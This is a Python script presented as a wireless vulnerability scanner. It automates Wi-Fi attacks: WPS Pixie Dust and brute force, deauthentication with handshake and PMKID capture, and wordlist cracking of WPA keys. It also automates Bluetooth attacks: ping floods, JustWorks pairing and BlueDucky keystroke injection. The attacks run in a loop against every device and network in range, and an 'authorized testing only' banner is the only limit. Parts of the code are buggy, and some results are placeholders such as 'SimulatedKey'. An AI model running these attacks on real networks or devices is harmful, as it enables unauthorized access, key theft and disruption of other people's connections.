import subprocess
import time
import logging
import re
import asyncio
import os
import sys
import argparse
import shutil
import json
import csv
from datetime import datetime
try:
    from bleak import BleakScanner, BleakClient
except ImportError:
    BleakScanner = None
    BleakClient = None

# Valid attack names
WIFI_ATTACKS = {"pixiedust", "bruteforce", "handshake", "pmkid", "wifite", "kismet"}
BLUETOOTH_ATTACKS = {"justworks", "dos", "blueducky", "kismet"}

def run_command(command, timeout=30):
    """Execute a shell command and return output."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        logging.error(f"Command timed out: {command}")
        return "", "Timeout"
    except Exception as e:
        logging.error(f"Command failed: {command}, Error: {str(e)}")
        return "", str(e)

def install_dependencies():
    """Install required dependencies."""
    if os.geteuid() != 0:
        print("Error: Must run as root to install dependencies.")
        sys.exit(1)

    # Ensure paru is installed
    if not shutil.which("paru"):
        run_command("pacman -S --needed base-devel git")
        run_command("git clone https://aur.archlinux.org/paru.git")
        run_command("cd paru && makepkg -si --noconfirm && cd .. && rm -rf paru")

    # Install Arch packages
    run_command("paru -S --needed bluez bluez-utils python bettercap aircrack-ng reaver bully hcxdumptool wifite kismet")

    # Install AUR packages
    if not run_command("paru -Qs python-pybluez")[0]:
        if not run_command("paru -S --needed python-pybluez")[0]:
            run_command("git clone https://github.com/pybluez/pybluez.git")
            run_command("cd pybluez && python setup.py install && cd .. && rm -rf pybluez")
    if not run_command("paru -Qs python-bleak")[0]:
        run_command("paru -S --needed python-bleak")

    # Clone BlueDucky
    if not os.path.isdir("BlueDucky"):
        run_command("git clone https://github.com/pentestfunctions/BlueDucky.git")
        run_command("cd BlueDucky && python3 -m pip install -r requirements.txt && cd ..")
    if os.path.isfile("BlueDucky/main.py"):
        run_command("chmod +x BlueDucky/main.py")

def setup_wifi_interface():
    """Detect and set Wi-Fi interface to monitor mode."""
    stdout, stderr = run_command("iw dev")
    if stderr:
        print(f"Error detecting Wi-Fi interface: {stderr}")
        sys.exit(1)
    match = re.search(r"Interface (\w+)", stdout)
    if not match:
        print("Error: No Wi-Fi interface found.")
        sys.exit(1)
    wifi_iface = match.group(1)
    run_command(f"airmon-ng start {wifi_iface}")
    stdout, stderr = run_command("iw dev")
    monitor_iface = re.search(r"Interface (\w*mon)", stdout)
    return monitor_iface.group(1) if monitor_iface else wifi_iface

def cleanup_wifi_interface(iface):
    """Set Wi-Fi interface back to managed mode."""
    run_command(f"airmon-ng stop {iface}")

def discover_classic_devices():
    """Discover Bluetooth Classic devices using bluetoothctl."""
    logging.info("Starting Bluetooth Classic device discovery...")
    devices = []
    run_command("hciconfig hci0 up")
    run_command("hciconfig hci0 piscan")
    run_command("echo -e 'scan on\n' | bluetoothctl", timeout=10)
    time.sleep(5)
    stdout, stderr = run_command("echo -e 'devices\n' | bluetoothctl")
    run_command("echo -e 'scan off\n' | bluetoothctl")
    
    if stderr:
        logging.error(f"Classic discovery error: {stderr}")
        return devices

    for line in stdout.splitlines():
        if re.match(r"Device ([0-9A-F:]{17}) (.+)", line):
            mac, name = re.match(r"Device ([0-9A-F:]{17}) (.+)", line).groups()
            devices.append({"mac": mac, "name": name, "type": "classic"})
            logging.info(f"Found classic device: {name} ({mac})")
    return devices

async def discover_ble_devices():
    """Discover BLE devices using bleak."""
    if BleakScanner is None:
        logging.error("Bleak not installed. Skipping BLE discovery.")
        return []
    devices = []
    logging.info("Starting BLE device discovery...")
    try:
        ble_devices = await BleakScanner.discover(timeout=5.0)
        for device in ble_devices:
            devices.append({"mac": device.address, "name": device.name or "Unknown", "type": "ble"})
            logging.info(f"Found BLE device: {device.name or 'Unknown'} ({device.address})")
    except Exception as e:
        logging.error(f"BLE discovery error: {str(e)}")
    return devices

def enumerate_classic_services(mac):
    """Enumerate services on a Bluetooth Classic device."""
    logging.info(f"Enumerating classic services for {mac}...")
    stdout, stderr = run_command(f"echo -e 'info {mac}\n' | bluetoothctl")
    if stderr:
        logging.error(f"Classic service enumeration failed for {mac}: {stderr}")
        return {}
    logging.info(f"Classic device info for {mac}:\n{stdout}")
    return {"mac": mac, "info": stdout}

async def enumerate_ble_services(mac):
    """Enumerate GATT services on a BLE device."""
    if BleakClient is None:
        logging.error("Bleak not installed. Skipping BLE service enumeration.")
        return {}
    logging.info(f"Enumerating BLE services for {mac}...")
    services_info = []
    try:
        async with BleakClient(mac, timeout=20.0) as client:
            services = await client.get_services()
            for service in services:
                service_data = {"uuid": service.uuid, "characteristics": []}
                for char in service.characteristics:
                    service_data["characteristics"].append({
                        "uuid": char.uuid,
                        "properties": char.properties
                    })
                services_info.append(service_data)
                logging.info(f"BLE Service for {mac}: {service}")
    except Exception as e:
        logging.error(f"BLE service enumeration failed for {mac}: {str(e)}")
    return {"mac": mac, "services": services_info}

def attempt_dos(mac, device_type):
    """Attempt a DoS attack using l2ping for Classic or bettercap for both."""
    logging.info(f"Attempting DoS on {mac} ({device_type})...")
    result = {"attack": "dos", "mac": mac, "type": device_type, "success": False, "output": ""}
    if device_type == "classic":
        stdout, stderr = run_command(f"l2ping -s 600 -c 10 {mac}")
        if stderr:
            logging.error(f"DoS failed for {mac}: {stderr}")
            result["output"] = stderr
        else:
            logging.info(f"DoS attempt on {mac} completed.")
            result["success"] = True
            result["output"] = stdout
    stdout, stderr = run_command(f"bettercap -eval 'ble.recon on; ble.enum {mac}; ble.recon off'")
    if stderr:
        logging.error(f"Bettercap DoS failed for {mac}: {stderr}")
        result["output"] += stderr
    else:
        logging.info(f"Bettercap DoS attempt on {mac} completed.")
        result["success"] = True
        result["output"] += stdout
    return result

def attempt_justworks_pairing(mac):
    """Attempt JustWorks pairing vulnerability."""
    logging.info(f"Attempting JustWorks pairing on {mac}...")
    result = {"attack": "justworks", "mac": mac, "success": False, "key": None, "output": ""}
    run_command("hciconfig hci0 piscan")
    run_command("hciconfig hci0 auth")
    stdout, stderr = run_command(f"echo -e 'pair {mac}\n' | bluetoothctl")
    if "Pairing successful" in stdout:
        logging.info(f"JustWorks pairing successful on {mac}")
        result["success"] = True
        # Simulate key extraction (bluetoothctl doesn't expose keys directly)
        result["key"] = "SimulatedKey"  # Placeholder, as actual key extraction requires custom tools
        stdout_conn, stderr_conn = run_command(f"echo -e 'connect {mac}\n' | bluetoothctl")
        if "Connection successful" in stdout_conn:
            logging.info(f"Connected to {mac}")
            result["output"] = stdout + stdout_conn
        else:
            logging.error(f"Connection failed for {mac}: {stderr_conn}")
            result["output"] = stdout + stderr_conn
    else:
        logging.error(f"Pairing failed for {mac}: {stderr}")
        result["output"] = stderr
    return result

def run_blueducky(mac):
    """Run BlueDucky for HID injection attack."""
    logging.info(f"Attempting BlueDucky attack on {mac}...")
    result = {"attack": "blueducky", "mac": mac, "success": False, "payload": None, "output": ""}
    if not os.path.isfile("BlueDucky/main.py"):
        logging.error("BlueDucky not found. Skipping attack.")
        return result
    stdout, stderr = run_command(f"python3 BlueDucky/main.py {mac}")
    if stderr:
        logging.error(f"BlueDucky attack failed for {mac}: {stderr}")
        result["output"] = stderr
    else:
        logging.info(f"BlueDucky attack on {mac}:\n{stdout}")
        result["success"] = True
        result["output"] = stdout
        # Simulate payload extraction
        result["payload"] = "SimulatedPayload"  # Placeholder, depends on BlueDucky output
    return result

def discover_wifi_networks(iface):
    """Discover Wi-Fi networks with WPS or WPA using wash and airodump-ng."""
    logging.info(f"Scanning Wi-Fi networks on {iface}...")
    networks = {"wps": [], "wpa": []}
    
    # WPS scan with wash
    stdout, stderr = run_command(f"wash -i {iface} -s", timeout=30)
    if stderr:
        logging.error(f"WPS scan error: {stderr}")
    else:
        for line in stdout.splitlines():
            if re.match(r"([0-9A-F:]{17})\s+([0-9]+)\s+(-?[0-9]+)\s+([0-9.]+)\s+([0-9]+)\s+(.+?)\s+(Yes|No)", line):
                bssid, channel, rssi, wps_version, wps_state, essid, wps_locked = re.match(
                    r"([0-9A-F:]{17})\s+([0-9]+)\s+(-?[0-9]+)\s+([0-9.]+)\s+([0-9]+)\s+(.+?)\s+(Yes|No)", line).groups()
                if wps_locked == "No":
                    networks["wps"].append({"bssid": bssid, "essid": essid.strip(), "channel": channel})
                    logging.info(f"Found WPS-enabled network: {essid} ({bssid}, Channel {channel})")

    # WPA scan with airodump-ng
    stdout, stderr = run_command(f"airodump-ng --encrypt WPA -w wifi_scan --output-format csv {iface}", timeout=30)
    if stderr:
        logging.error(f"WPA scan error: {stderr}")
    else:
        for line in stdout.splitlines():
            if re.match(r"([0-9A-F:]{17}),.*?,([0-9]+),.*?WPA.*?,(.+?),.*?,([0-9]+)", line):
                bssid, channel, essid, clients = re.match(
                    r"([0-9A-F:]{17}),.*?,([0-9]+),.*?WPA.*?,(.+?),.*?,([0-9]+)", line).groups()
                if int(clients) > 0:
                    networks["wpa"].append({"bssid": bssid, "essid": essid.strip(), "channel": channel})
                    logging.info(f"Found WPA network with clients: {essid} ({bssid}, Channel {channel})")
    
    return networks

def attempt_wps_attacks(iface, network, selected_attacks, wordlist):
    """Attempt WPS attacks (PixieDust, brute-force) using reaver and bully."""
    results = []
    bssid = network["bssid"]
    essid = network["essid"]
    channel = network["channel"]
    logging.info(f"Attempting WPS attacks on {essid} ({bssid})...")
    
    run_command(f"iwconfig {iface} channel {channel}")
    
    if "pixiedust" in selected_attacks:
        stdout, stderr = run_command(f"reaver -i {iface} -b {bssid} -c {channel} -vv -K 1", timeout=60)
        result = {"attack": "pixiedust", "bssid": bssid, "essid": essid, "success": False, "pin": "", "key": "", "output": ""}
        if stderr:
            logging.error(f"PixieDust attack failed for {bssid}: {stderr}")
            result["output"] = stderr
        else:
            logging.info(f"PixieDust attack on {bssid}:\n{stdout}")
            pin_match = result["pin"] = re.search(r"WPS PIN: '(.+)'", stdout)
            key_match = re.search(r"Password: '(.+)'", stdout)
            if pin_match:
                result["success"] = True
                result["pin"] = pin_match.group(1)
                result["key"] = key_match.group(1) if key_match else ""
            result["output"] = stdout
        results.append(result)

    if "bruteforce" in selected_attacks:
        stdout, stderr = run_command(f"bully -b {bssid} -c {channel} -i {iface} -v 3", timeout=60)
        result = {"attack": "bruteforce", "bssid": bssid, "essid": essid, "success": False, "pin": "", "key": "", "output": ""}
        if stderr:
            logging.error(f"Bully attack failed for {bssid}: {stderr}")
            result["output"] = stderr
        else:
            logging.info(f"Bully attack on {bssid}:\n{stdout}")
            pin_match = re.search(r"PIN: '(.+)'", stdout)
            key_match = re.search(r"KEY: '(.+)'", stdout)
            if pin_match:
                result["success"] = True
                result["pin"] = pin_match.group(1)
                result["key"] = key_match.group(1) if key_match else ""
            result["output"] = stdout
        results.append(result)

    return results

def attempt_wpa_attacks(iface, network, selected_attacks, wordlist):
    """Attempt WPA handshake or PMKID capture."""
    results = []
    bssid = network["bssid"]
    essid = network["essid"]
    channel = network["channel"]
    logging.info(f"Attempting WPA attacks on {essid} ({bssid})...")
    
    run_command(f"iwconfig {iface} channel {channel}")
    
    if "handshake" in selected_attacks:
        logging.info(f"Capturing handshake for {bssid} (150 seconds)...")
        handshake_file = f"handshake_{bssid.replace(':', '_')}.cap"
        deauth = subprocess.Popen(f"aireplay-ng -0 10 -a {bssid} {iface}", shell=True)
        stdout, stderr = run_command(f"airodump-ng --bssid {bssid} -c {channel} -w {handshake_file} --output-format pcap {iface}", timeout=150)
        deauth.terminate()
        result = {"attack": "handshake", "bssid": bssid, "essid": essid, "success": False, "key": "", "file": handshake_file, "output": ""}
        if stderr:
            logging.error(f"Handshake capture failed for {bssid}: {stderr}")
            result["output"] = stderr
        else:
            logging.info(f"Handshake capture succeeded for {bssid}")
            result["success"] = True
            result["output"] = stdout
            # Attempt to crack with aircrack-ng if wordlist provided
            if wordlist:
                stdout_crack, stderr_crack = run_command(f"aircrack-ng {handshake_file} -w {wordlist}", timeout=300)
                if "KEY FOUND" in stdout_crack:
                    key_match = re.search(r"KEY FOUND! \[ (.+?) \]", stdout_crack)
                    result["key"] = key_match.group(1) if key_match else ""
                    logging.info(f"Cracked WPA key for {bssid}: {result['key']}")
                result["output"] += stdout_crack + stderr_crack
        results.append(result)

    if "pmkid" in selected_attacks:
        logging.info(f"Capturing PMKID for {bssid} (60 seconds)...")
        pmkid_file = f"pmkid_{bssid.replace(':', '_')}.cap"
        stdout, stderr = run_command(f"hcxdumptool -i {iface} -o {pmkid_file} --enable_status=1", timeout=60)
        result = {"attack": "pmkid", "bssid": bssid, "essid": essid, "success": False, "key": "", "file": pmkid_file, "output": ""}
        if stderr:
            logging.error(f"PMKID capture failed for {bssid}: {stderr}")
            result["output"] = stderr
        else:
            logging.info(f"PMKID capture succeeded for {bssid}")
            result["success"] = True
            result["output"] = stdout
            if wordlist:
                stdout_crack, stderr_crack = run_command(f"aircrack-ng {pmkid_file} -w {wordlist}", timeout=300)
                if "KEY FOUND" in stdout_crack:
                    key_match = re.search(r"KEY FOUND! \[ (.+?) \]", stdout_crack)
                    result["key"] = key_match.group(1) if key_match else ""
                    logging.info(f"Cracked PMKID key for {bssid}: {result['key']}")
                result["output"] += stdout_crack + stderr_crack
        results.append(result)

    return results

def attempt_wifite_attack(iface, wordlist):
    """Run wifite for automated Wi-Fi attacks."""
    logging.info(f"Running wifite on {iface}...")
    results = []
    cmd = f"wifite --no-wps --no-wep -i {iface} --kill"
    if wordlist:
        cmd += f" -w {wordlist}"
    stdout, stderr = run_command(cmd, timeout=300)
    result = {"attack": "wifite", "networks": [], "success": False, "output": stdout + stderr}
    if stderr and "success" not in stderr.lower():
        logging.error(f"Wifite attack failed: {stderr}")
    else:
        logging.info(f"Wifite succeeded:\n{stdout}")
        result["success"] = True
        # Parse wifite output
        for line in stdout.splitlines():
            if re.search(r"([0-9A-F:]{17}).*?password: (.+)", line, re.IGNORECASE):
                bssid, password = re.search(r"([0-9A-F:]{17}).*?password: (.+)", line, re.IGNORECASE).groups()
                network = {"bssid": bssid, "essid": "", "key": password}
                result["networks"].append(network)
                logging.info(f"Cracked WPA key via wifite: {network}")
    results.append(result)
    return results

def attempt_kismet_wifi_scan(iface):
    """Run kismet for passive Wi-Fi scanning."""
    logging.info(f"Running kismet Wi-Fi scan on {iface}...")
    results = []
    stdout, stderr = run_command(f"kismet -c {iface} --silent", timeout=60)
    result = {"attack": "kismet_wifi", "networks": [], "success": False, "output": stdout + stderr}
    if stderr:
        logging.error(f"Kismet Wi-Fi scan failed: {stderr}")
    else:
        logging.info(f"Kismet Wi-Fi scan succeeded:\n{stdout}")
        result["success"] = True
        # Parse kismet output (simplified)
        for line in stdout.splitlines():
            if re.search(r"BSSID: ([0-9A-F:]{17}), ESSID: (.+?), Channel: ([0-9]+)", line):
                bssid, essid, channel = re.search(r"BSSID: ([0-9A-F:]{17}), ESSID: (.+?), Channel: ([0-9]+)", line).groups()
                result["networks"].append({"bssid": bssid, "essid": essid, "channel": channel})
                logging.info(f"Found network via kismet: {essid} ({bssid}, Channel {channel})")
    results.append(result)
    return results

def attempt_kismet_bluetooth_scan():
    """Run kismet for passive Bluetooth scanning."""
    logging.info("Running kismet Bluetooth scan...")
    results = []
    stdout, stderr = run_command("kismet -c bluetooth", timeout=60)
    result = {"attack": "kismet_bluetooth", "devices": [], "success": False, "output": stdout + stderr}
    if stderr:
        logging.error(f"Kismet Bluetooth scan failed: {stderr}")
    else:
        logging.info(f"Kismet Bluetooth scan succeeded:\n{stdout}")
        result["success"] = True
        # Parse kismet output
        for line in stdout.splitlines():
            if re.search(r"([0-9A-F:]{17}), Name (.+)", line):
                mac, name = re.search(r"([0-9A-F:]{17}), Name (.+)", line).groups()
                result["devices"].append({"mac": mac, "name": name})
                logging.info(f"Found Bluetooth device via kismet: {name} ({mac})")
    results.append(result)
    return results

def save_results(results, output_dir, prefix):
    """Save attack results to JSON and CSV."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    json_file = os.path.join(output_dir, f"{prefix}_results_{timestamp}.json")
    csv_file = os.path.join(output_dir, f"{prefix}_results_{timestamp}.csv")

    # Ensure output directory exists
    os.makedirs(output_dir, exist_ok=True)

    # Save JSON
    with open(json_file, "w") as f:
        json.dump(results, f, indent=2)
    logging.info(f"Saved JSON results to {json_file}")

    # Save CSV
    with open(csv_file, "w", newline="") as csvfile:
        if prefix == "wifi":
            fieldnames = ["attack", "bssid", "essid", "channel", "success", "pin", "key", "file", "output"]
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            for result in results:
                for network in result.get("networks", [result]):
                    row = {
                        "attack": result["attack"],
                        "bssid": network.get("bssid", result.get("bssid", "")),
                        "essid": network.get("essid", result.get("essid", "")),
                        "channel": network.get("channel", result.get("channel", "")),
                        "success": result["success"],
                        "pin": result.get("pin", ""),
                        "key": network.get("key", result.get("key", "")),
                        "file": result.get("file", ""),
                        "output": result["output"][:100]  # Truncate for CSV
                    }
                    writer.writerow(row)
        else:  # Bluetooth
            fieldnames = ["attack", "mac", "type", "name", "success", "key", "payload", "output"]
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            for result in results:
                for device in result.get("devices", [result]):
                    row = {
                        "attack": result["attack"],
                        "mac": device.get("mac", result.get("mac", "")),
                        "type": device.get("type", ""),
                        "name": device.get("name", ""),
                        "success": result["success"],
                        "key": device.get("key", result.get("key", "")),
                        "payload": result.get("payload", ""),
                        "output": result["output"][:100]
                    }
                    writer.writerow(row)
    logging.info(f"Saved CSV results to {csv_file}")

def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Wireless Vulnerability Scanner - For authorized testing only\n"
                    "Run with command-line options to perform Wi-Fi and Bluetooth attacks.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "--wifi",
        action="store_true",
        help="Run Wi-Fi attacks only (pixiedust, bruteforce, handshake, pmkid, wifite, kismet)"
    )
    parser.add_argument(
        "--bluetooth",
        action="store_true",
        help="Run Bluetooth/BLE attacks only (justworks, dos, blueducky, kismet)"
    )
    parser.add_argument(
        "--attacks",
        help="Comma-separated list of attacks to run (e.g., 'pixiedust,handshake' or 'justworks,dos')"
    )
    parser.add_argument(
        "--output-dir",
        "--output",
        default="results",
        help="Output directory for results (default: results)"
    )
    parser.add_argument(
        "--wordlist",
        "-w",
        help="Wordlist file for cracking WPA handshakes/PMKIDs with aircrack-ng"
    )
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Enable verbose output"
    )
    parser.add_argument(
        "--no-tui",
        action="store_true",
        help="Run in non-interactive mode (no effect, CLI only)"
    )

    args = parser.parse_args()

    if not args.wifi and not args.bluetooth:
        args.wifi = args.bluetooth = True  # Default to both

    selected_attacks = set()
    if args.attacks:
        selected_attacks = set(args.attacks.split(","))
        invalid_attacks = set(selected_attacks) - set(WIFI_ATTACKS | BLUETOOTH_ATTACKS)
        if invalid_attacks:
            print(f"Error: Invalid attacks: {invalid_attacks}")
            print("Valid Wi-Fi attacks:", ", ".join(WIFI_ATTACKS))
            print("Valid Bluetooth attacks:", ", ".join(BLUETOOTH_ATTACKS))
            sys.exit(1)
        if args.wifi and not selected_attacks & WIFI_ATTACKS:
            print("Error: --wifi specified but no valid Wi-Fi attacks in --attacks.")
            sys.exit(1)
        if args.bluetooth and not selected_attacks & BLUETOOTH_ATTACKS:
            print("Error: --bluetooth specified but no valid Bluetooth attacks in --attacks.")
            sys.exit(1)

    if args.wordlist and not os.path.isfile(args.wordlist):
        print(f"Error: Wordlist file {args.wordlist} does not exist.")
        sys.exit(1)

    return args, selected_attacks

async def main():
    args, selected_attacks = parse_arguments()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = os.path.join(args.output_dir, f"results_{timestamp}")
    
    # Set up logging
    os.makedirs(output_dir, exist_ok=True)
    logging.basicConfig(
        filename=os.path.join(output_dir, f"scan_{timestamp}.log"),
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s"
    )
    
    print("Wireless Vulnerability Scanner - For authorized testing only")
    print("Ensure you have permission to scan and test devices/networks.")
    print(f"Logging results to: {output_dir}/scan_{timestamp}.log")
    logging.info("Script started")

    # Install dependencies
    install_dependencies()

    # Set up Wi-Fi interface
    wifi_iface = setup_wifi_interface() if args.wifi else None
    wifi_results = []
    bluetooth_results = []

    try:
        while True:
            devices = []
            networks = {"wps": [], "wpa": []}
            
            if args.bluetooth:
                print("\nScanning Bluetooth devices...")
                classic_devices = discover_classic_devices()
                ble_devices = await discover_ble_devices()
                devices = classic_devices + ble_devices
                
                for device in devices:
                    mac = device["mac"]
                    name = device["name"]
                    device_type = device["type"]
                    print(f"Testing {device_type} device: {name} ({mac})")
                    logging.info(f"Testing {device_type} device: {name} ({mac})")
                    
                    if device_type == "classic":
                        bluetooth_results.append(enumerate_classic_services(mac))
                    else:
                        bluetooth_results.append(await enumerate_ble_services(mac))
                    
                    if not selected_attacks or "dos" in selected_attacks:
                        bluetooth_results.append(attempt_dos(mac, device_type))
                    if device_type == "classic" and (not selected_attacks or "justworks" in selected_attacks):
                        bluetooth_results.append(attempt_justworks_pairing(mac))
                    if not selected_attacks or "blueducky" in selected_attacks:
                        bluetooth_results.append(run_blueducky(mac))
                    if not selected_attacks or "kismet" in selected_attacks:
                        bluetooth_results.extend(attempt_kismet_bluetooth_scan())
                
                save_results(bluetooth_results, output_dir, "bluetooth")
            
            if args.wifi:
                print("\nScanning Wi-Fi networks...")
                networks = discover_wifi_networks(wifi_iface)
                
                for network in networks["wps"]:
                    print(f"Attacking WPS network: {network['essid']} ({network['bssid']})")
                    wifi_results.extend(attempt_wps_attacks(wifi_iface, network, selected_attacks or WIFI_ATTACKS, args.wordlist))
                
                for network in networks["wpa"]:
                    print(f"Attacking WPA network: {network['essid']} ({network['bssid']})")
                    wifi_results.extend(attempt_wpa_attacks(wifi_iface, network, selected_attacks or WIFI_ATTACKS, args.wordlist))
                
                if not selected_attacks or "wifite" in selected_attacks:
                    print("Running wifite attack...")
                    wifi_results.extend(attempt_wifite_attack(wifi_iface, args.wordlist))
                
                if not selected_attacks or "kismet" in selected_attacks:
                    print("Running kismet Wi-Fi scan...")
                    wifi_results.extend(attempt_kismet_wifi_scan(wifi_iface))
                
                save_results(wifi_results, output_dir, "wifi")
            
            if not devices and not networks["wps"] and not args.wifi:
                logging.error("No devices or networks found.")
                print("No devices or networks found. Retrying in 30 seconds...")
                time.sleep(30)
                continue
                
            logging.info("Completed scan cycle completed.. Waiting 30 seconds before next scan...")
            print("Scan cycle completed. Waiting 30 seconds...")
            time.sleep(30)
        
    except KeyboardInterrupt:
        print("\nScript terminated by user.")
        logging.error("Script terminated by user")
        run_command("echo -e 'scan off\n\n' | bluetoothctl")
        sys.exit(0)
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        logging.error(f"Script error: {str(e)}")
        run_command("echo -e 'scan off\n' | bluetoothctl")
        sys.exit(1)
    finally:
        if wifi_iface:
            cleanup_wifi_interface(wifi_iface)
        save_results(wifi_results, output_dir, "wifi")
        save_results(bluetooth_results(bluetooth_results, output_dir, "bluetooth"))
    
    logging.info("Script ended")

if __name__ == "__main__":
    asyncio.run(main())⏎                                                               
